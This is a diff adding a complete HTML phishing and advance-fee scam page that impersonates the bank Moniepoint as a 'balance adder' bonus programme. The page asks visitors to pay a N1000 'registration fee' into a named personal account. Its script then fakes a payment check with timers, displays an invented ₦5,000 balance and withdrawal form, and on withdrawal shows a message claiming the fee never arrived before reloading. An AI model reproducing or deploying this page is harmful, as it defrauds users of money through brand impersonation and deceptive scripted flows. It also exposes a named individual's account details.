@@ -1,0 +1,256 @@
+<html><head><base href="https://www.moniepointbalanceadder.com/becomemember">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Moniepoint App</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    body {
+        background-color: #f4f4f4;
+    }
+
+    .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+
+    .header {
+        text-align: center;
+        padding: 20px 0;
+    }
+
+    .header img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    .message-container {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        margin-top: 20px;
+        text-align: center;
+    }
+
+    .message {
+        line-height: 1.6;
+        margin-bottom: 30px;
+        color: #333;
+        font-size: 16px;
+    }
+
+    .btn {
+        background-color: #007bff;
+        color: white;
+        padding: 15px 30px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 18px;
+        transition: background-color 0.3s;
+        text-decoration: none;
+        display: inline-block;
+        margin-top: 20px;
+    }
+
+    .btn:hover {
+        background-color: #0056b3;
+    }
+
+    .account-details {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        margin-top: 20px;
+        display: none;
+        animation: slideDown 0.5s ease-out;
+        text-align: center;
+        font-size: 18px;
+        line-height: 1.8;
+    }
+
+    .loading {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+    }
+
+    .dot-loading {
+        display: inline-block;
+        width: 50px;
+        height: 50px;
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #3498db;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    .error-message {
+        display: none;
+        color: #721c24;
+        background-color: #f8d7da;
+        padding: 15px;
+        margin-top: 20px;
+        border-radius: 5px;
+    }
+
+    .withdrawal-form {
+        display: none;
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        margin-top: 20px;
+    }
+
+    .form-group {
+        margin-bottom: 15px;
+    }
+
+    .form-group label {
+        display: block;
+        margin-bottom: 5px;
+    }
+
+    .form-group input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+    }
+
+    .overlay-message {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        color: black;
+        padding: 20px;
+        text-align: center;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        width: 90%;
+        max-width: 600px;
+        margin: 0 auto;
+        font-size: 16px;
+        line-height: 1.6;
+        z-index: 1000;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-20px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://cdn.punchng.com/wp-content/uploads/2023/09/03011717/IMAGE-2023-09-03-011712.jpg" alt="Moniepoint Logo">
+        </div>
+
+        <div class="message-container">
+            <div class="message">
+                MONIEPOINT MFB BALANCE ADDER IS A PROGRAMME THAT IS LAUNCHED FOR USERS TO GET AWARE OF OUR BANKING SERVICES. MONIEPOINT IS A BANK THAT OFFERS SEAMLESS DAILY TRANSACTIONS WITH LOW CHARGES FEES. OUR BANKING SERVICES IS TRUSTED BY MILLIONS AND WE HAVE DISTRIBUTED MORE THAN 800,000 POS MACHINES. THIS SERVICE IS NOT AN INVESTMENT OR PAID TO EARN PLATFORM BUT REGISTRATION IS FOR US TO ENSURE THAT YOU HAVE THE MONIEPOINT APP ON YOUR DEVICE OR POS MACHINE. THE AMOUNT DISTRIBUTED SO FAR IS THE AMOUNT WE HAVE GOTTEN FROM THE CHARGES OF SMS FEES AND TRANSACTION FEES DEDUCTED FROM EACH USERS, AND NOW WE ARE HERE TO GIVE IT BACK AS A BONUS OF BEING A MEMBER. TO GET STARTED IN THIS PROGRAMME AND BENEFIT. CLICK THE BUTTON BELOW TO BECOME A MEMBER TODAY
+            </div>
+            <button class="btn" id="registerBtn">Become a Member</button>
+        </div>
+
+        <div class="account-details" id="accountDetails">
+            <p>MONIEPOINT MFB</p>
+            <p>OSAKUE EMMANUEL EDUGIE</p>
+            <p>5567858966</p>
+            <p>REGISTRATION FEE N1000</p>
+            <button class="btn" id="paymentBtn">I Have Made Payment</button>
+            <div class="loading" id="loading">
+                <div class="dot-loading"></div>
+            </div>
+            <div class="error-message" id="errorMessage">
+                Payment not yet confirmed maybe due to network issues. Redirecting to withdrawal page...
+            </div>
+        </div>
+
+        <div class="withdrawal-form" id="withdrawalForm">
+            <h2>Balance: ₦5,000</h2>
+            <div class="form-group">
+                <label>Bank Name:</label>
+                <input type="text" value="MONIEPOINT MFB" readonly>
+            </div>
+            <div class="form-group">
+                <label>Account Number:</label>
+                <input type="text" id="accountNumber">
+            </div>
+            <div class="form-group">
+                <label>Account Name:</label>
+                <input type="text" id="accountName">
+            </div>
+            <div class="form-group">
+                <label>Amount:</label>
+                <input type="text" value="₦5,000" readonly>
+            </div>
+            <button class="btn" id="withdrawBtn">WITHDRAW</button>
+        </div>
+    </div>
+
+    <div class="overlay-message" id="overlayMessage">
+        YOUR MEMBERSHIP FEE HASN'T ARRIVED YET. THIS IS NOT AN INVESTMENT PLATFORM IT IS A FEE FOR US TO DETECT YOU ARE USING A MONIEPOINT ACCOUNT THROUGH THE TRANSACTION MADE BY YOU. IF YOU ARE NOT A MONIEPOINT USER, KINDLY DOWNLOAD OUR APP FROM THE APPLE APP STORE, SAMSUNG GALAXY STORE OR THE GOOGLE PLAYSTORE AND OPEN AN ACCOUNT, THEN COME BACK HERE AND CLAIM YOUR REWARD.
+    </div>
+
+    <script>
+        document.getElementById('registerBtn').addEventListener('click', function() {
+            document.getElementById('accountDetails').style.display = 'block';
+            this.parentElement.style.display = 'none';
+        });
+
+        document.getElementById('paymentBtn').addEventListener('click', function() {
+            const loading = document.getElementById('loading');
+            const errorMessage = document.getElementById('errorMessage');
+            const withdrawalForm = document.getElementById('withdrawalForm');
+            
+            this.style.display = 'none';
+            loading.style.display = 'block';
+
+            setTimeout(() => {
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+                
+                setTimeout(() => {
+                    document.getElementById('accountDetails').style.display = 'none';
+                    errorMessage.style.display = 'none';
+                    withdrawalForm.style.display = 'block';
+                }, 10000);
+            }, 20000);
+        });
+
+        document.getElementById('withdrawBtn').addEventListener('click', function() {
+            const overlayMessage = document.getElementById('overlayMessage');
+            overlayMessage.style.display = 'block';
+            
+            setTimeout(() => {
+                window.location.reload();
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
